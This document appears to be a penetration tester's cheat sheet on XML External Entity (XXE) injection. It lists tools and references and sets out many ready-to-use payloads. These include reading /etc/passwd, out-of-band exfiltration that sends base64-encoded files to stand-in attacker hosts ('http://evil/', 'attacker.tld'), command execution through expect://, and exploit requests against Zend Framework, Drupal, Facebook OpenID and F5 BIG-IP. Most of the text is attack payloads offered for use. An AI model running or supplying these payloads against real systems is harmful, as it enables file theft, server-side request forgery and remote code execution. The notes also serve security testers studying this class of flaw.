### XML External Entity attacks

##### tools
+	https://github.com/ssexxe/XXEBugFind # works on compilded java code
+	https://github.com/BuffaloWill/oxml_xxe #docs, xlsx, pptx, odt, svg ...
+	otori
+	https://blog.gdssecurity.com/labs/2015/4/29/automated-data-exfiltration-with-xxe.html
+	https://github.com/joernchen/xxeserve


##### links
+	http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf (Must Read)
+	https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
+	https://www.youtube.com/watch?v=eBm0YhBrT_c
+	http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
+	http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf
+	http://www.nosuchcon.org/talks/2013/D3_03_Alex&Timur_XML_Out_Of_Band.pdf
+	http://christian-schneider.net/GenericXxeDetection.html#main
+	http://blog.gdssecurity.com/labs/2015/4/29/automated-data-exfiltration-with-xxe.html
+	https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
+	http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-injection
+	https://www.sans.org/blog/exploiting-xxe-vulnerabilities-in-iis-net
+  https://www.youtube.com/watch?v=p8wbebEgtDk

- directories can be listed using `file://MY_DIR/`
- valid XML files in ASCII or UTF-8 format can be read using `file://MY_DIR/MY_FILE`
- plain text files (no markup, no entities) in ASCII or UTF-8 can also be read using `file://MY_DIR/MY_FILE`
- `gopher: `(disabled since Java 7)
- `jar:{url}!{path}`
- `php: ...`
- internal port scan
- relay attacks to other hosts

##### cheat sheet
* http://web-in-security.blogspot.com.au/2016/03/xxe-cheat-sheet.html
* http://www.securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html

##### validate xml
- http://www.xmlvalidation.com/index.php

##### test (xmlrpc)
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe "system.listMethods" >]><methodCall><methodName>&xxe;</methodName></methodCall>
```

##### test
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "blah" > ]><tag>&xxe;</tag>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><tag>&xxe;</tag>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil/blah" > ]><tag>&xxe;</tag>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://../"> %xxe;]>
```

##### XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
##### Zend Framework (patched in versions 1.11.12 and 1.12.0 of Zend Framework)
- https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120626-0_zend_framework_xxe_injection.txt
- http://framework.zend.com/security/advisory/ZF2012-01
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>
```
##### upload
* gopher
   - useful because java doesn't support `http://login:pass@host` but ok for `ftp://`

* jar
 - `jar:http://x.x.x.x/blah.jar!/mypkg/lol.class`
 - `jar:file:///etc/hosts!/` # can enum files but i havent found how to yield file content with this
 - point to remote URL will temporarily save the file (need dir listing to know name of temp file tho)
 - can upload any format not just zip

##### can RCE if expect module is installed and loaded (not by default)
```xml
<!ENTITY a SYSTEM 'expect://id'>
```
##### exfil
- payload:
```xml
<!DOCTYPE meh [<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"><!ENTITY % dtd SYSTEM "http://evil/send.dtd">%dtd;%send;]]>
```
- send.dtd:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">%all;
```
##### exfil2
- payload:
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://evil/oob.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```
- oob.xml
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil/?%data;'>">
```
##### synacktiv drupal services
```xml
<!DOCTYPE doc [
 <!ENTITY % remote SYSTEM "http://../test.xml">
 %remote;
 %intern;
 %trick;
]>
```
- test.xml:
```xml
<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://WOOT%payload;WOOT'>">
```
- if no outbound:
```xml
<!DOCTYPE doc [
 <!ENTITY % evil SYSTEM "php://filter/convert.base64-decode/resource=data:,`base64(text.xml)`">
 %evil;
 %intern;
 %trick;
]>
```
###### "What you didn't know about XML External Entities Attacks" by Timothy Morgan (http://www.youtube.com/watch?v=eHSNT8vWLfc)
###### paper final: http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
## CDATA trick (works on java impl)

```xml
<!DOCTYPE meh [
  <!ENTITY % file SYSTEM "file:///has/broken/xml">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://evil/join.dtd">
%dtd;
]]>
<lastname>&all;</lastname>
join.dtd contains:
<!ENTITY all "%start;%file;%end;">
```
##### using file-not-found trick to solve exfiltration restrictions ("one line only" and XML metachars), but need outbound to attacker site (http://www.christian-schneider.net/GenericXxeDetection.html)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
  %one;
  %two;
  %four;
]>

dtd-part:
<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///"%three;"'>">
```

##### facebook xxe via OpenID
 - https://www.sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/
 - http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution (openid bug)
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE xrds:XRDS [
   <!ELEMENT xrds:XRDS (XRD)>
   <!ATTLIST xrds:XRDS xmlns:xrds CDATA "xri://$xrds">
   <!ATTLIST xrds:XRDS xmlns:openid CDATA "http://openid.net/xmlns/1.0">
   <!ATTLIST xrds:XRDS xmlns CDATA "xri://$xrd*($v*2.0)">
   <!ELEMENT XRD (Service)*>
   <!ELEMENT Service (Type,URI,openid:Delegate)>
   <!ATTLIST Service priority CDATA "0">
   <!ELEMENT Type (#PCDATA)>
   <!ELEMENT URI (#PCDATA)>
   <!ELEMENT openid:Delegate (#PCDATA)>
   <!ENTITY a SYSTEM 'http://198.x.x.143:7806/success.txt'> ]>

<xrds:XRDS xmlns:xrds="xri://$xrds" xmlns:openid="http://openid.net/xmlns/1.0" xmlns="xri://$xrd*($v*2.0)">
  <XRD>
    <Service priority="0">
      <Type>http://openid.net/signon/1.0</Type>
      <URI>http://198.x.x.143:7806/raw.xml</URI>
      <openid:Delegate>http://198.x.x.143:7806/delegate</openid:Delegate>
    </Service>
    <Service priority="0">
      <Type>http://openid.net/signon/1.0</Type>
      <URI>&a;</URI>
      <openid:Delegate>http://198.x.x.143:7806/delegate</openid:Delegate> </Service>
  </XRD>
</xrds:XRDS>
```
##### facebook xxe via CV
- http://www.attack-secure.com/blog/hacked-facebook-word-document

##### portcullis F5 big-ip
```xml
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-6032/
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-6033/
action=write&contents=<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://x.x.x.x/xml?f=/etc/passwd"> %remote;
%int;
%trick;]><viewList>
  <view id="asd">
    <window>
      <setting name="x" value="0"/>
      <setting name="height" value="256"/>
      <setting name="y" value="190"/>
      <setting name="typeId" value="BwControlTemplWindow"/>
      <setting name="selectedMode" value="Both"/>
      <setting name="width" value="508"/>
    </window>
    <window>
      <setting name="x" value="515"/>
      <setting name="height" value="256"/>
      <setting name="toggleOn" value="true"/>
      <setting name="y" value="0"/>
      <setting name="typeId" value="MemWindow"/>
      <setting name="selectedMode" value="Both"/>
      <setting name="width" value="508"/>
      <setting name="viewSwitch" value="false"/>
    </window>
  </view>
</viewList>&name=asdasd
```
##### fuzz
 - xmlfuzz

##### more tricks
 - http://www.pwntester.com/blog/2013/11/28/abusing-jar-downloads/
 - https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/
 - https://twitter.com/Agarri_FR/status/595598007996919808 
      - Use `%payload;://xxx` as the final URL for inline leak via error messages (Java, at least)" "I used that trick last week: dynamic DTD w/o OOB leak (very uncommon), no data outside of attributes, verbose Java parser"
 - https://twitter.com/Agarri_FR/status/659182619796574209 
      - "Under Java, FileInputStream will refuse to open "/" and "file:/" (they are directories). But `netdoc:/` is OK"
 - `file:///proc/self/cwd/../config/` # Java
 - https://www.synack.com/blog/a-deep-dive-into-xxe-injection/
 - https://mikeknoop.com/lxml-xxe-exploit/
